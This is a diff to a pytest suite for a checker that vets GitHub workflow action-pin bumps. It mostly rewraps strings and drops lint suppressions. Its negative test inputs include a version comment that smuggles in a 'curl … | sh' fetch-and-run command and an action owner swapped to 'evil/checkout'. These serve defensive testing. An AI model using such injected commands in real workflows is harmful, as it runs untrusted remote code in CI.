@@ -45,7 +45,7 @@ def _check(diff: str) -> subprocess.CompletedProcess:
     # these diffs name. That is deliberate and matches the original: no case
     # here writes an `index` line, so no base is ever read, and every workflow
     # diff graded through this helper is judged from its own context.
-    return subprocess.run(  # noqa: S603
+    return subprocess.run(
         [
             sys.executable,
             str(SCRIPT),
@@ -153,8 +153,10 @@ def test_accepts_a_github_action_sha_and_comment_bump(tmp_path):
     result = _check_workflow(
         tmp_path,
         "       - name: Checkout\n"
-        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7.0.1\n",
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
+        " # v7.0.1\n",
     )
     assert result.returncode == 0, result.stdout
 
@@ -165,8 +167,10 @@ def test_accepts_a_github_action_sha_only_bump(tmp_path):
     result = _check_workflow(
         tmp_path,
         "       - name: Checkout\n"
-        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
+        " # v7\n",
     )
     assert result.returncode == 0, result.stdout
 
@@ -174,7 +178,8 @@ def test_accepts_a_github_action_sha_only_bump(tmp_path):
 def test_refuses_a_github_action_swapped_owner_despite_a_matching_comment(tmp_path):
     result = _check_workflow(
         tmp_path,
-        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n"
         "+        uses: evil/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
     )
     assert result.returncode == 1
@@ -183,8 +188,10 @@ def test_refuses_a_github_action_swapped_owner_despite_a_matching_comment(tmp_pa
 def test_refuses_a_non_release_comment_change(tmp_path):
     result = _check_workflow(
         tmp_path,
-        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
-        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # pinned\n",
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n"
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
+        " # pinned\n",
     )
     assert result.returncode == 1
 
@@ -192,7 +199,8 @@ def test_refuses_a_non_release_comment_change(tmp_path):
 def test_refuses_a_comment_smuggling_extra_text_after_a_version_token(tmp_path):
     result = _check_workflow(
         tmp_path,
-        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+        "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
+        " # v7\n"
         "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
         " # v7.0.1 && curl -s https://example.invalid/x.sh | sh\n",
     )
@@ -203,7 +211,8 @@ def test_refuses_a_comment_appearing_where_there_was_none(tmp_path):
     result = _check_workflow(
         tmp_path,
         "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
-        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
+        "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
+        " # v7\n",
     )
     assert result.returncode == 1
 
@@ -321,8 +330,8 @@ def test_refuses_uses_embedded_in_a_run_step_disguised_as_a_first_time_pin(tmp_p
     result = _check_workflow(
         tmp_path,
         "-          run: uses: actions/checkout@v7\n"
-        "+          run: uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1"
-        " # v7\n",
+        "+          run: uses: actions/checkout@"
+        "3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n",
     )
     assert result.returncode == 1
 
@@ -727,8 +736,8 @@ def _git(repo, *args: str) -> str:
     # against a throwaway repository pytest created. Nothing here comes from
     # outside the test, and pinning an absolute git path would make the suite
     # depend on where the container installed it.
-    return subprocess.run(  # noqa: S603
-        [  # noqa: S607
+    return subprocess.run(
+        [
             "git",
             "-C",
             str(repo),
@@ -756,7 +765,7 @@ def _check_in_repo(tmp_path, before: str, after: str, *, base: str | None = None
     workflow.write_text(after)
     diff = _git(tmp_path, "diff")
     workflow.write_text(before if base is None else base)
-    return subprocess.run(  # noqa: S603
+    return subprocess.run(
         [
             sys.executable,
             str(SCRIPT),
@@ -823,7 +832,7 @@ def test_falls_back_when_the_hunks_disagree_with_the_base(tmp_path):
     workflow.write_text(after)
     diff = _git(tmp_path, "diff").replace("shallower than it.", "else at all.")
     workflow.write_text(before)
-    result = subprocess.run(  # noqa: S603
+    result = subprocess.run(
         [
             sys.executable,
             str(SCRIPT),
@@ -853,7 +862,7 @@ def test_falls_back_when_a_hunk_is_shorter_than_its_header(tmp_path):
     lines = _git(tmp_path, "diff").splitlines()
     diff = "\n".join(lines[:-1]) + "\n"
     workflow.write_text(before)
-    result = subprocess.run(  # noqa: S603
+    result = subprocess.run(
         [
             sys.executable,
             str(SCRIPT),
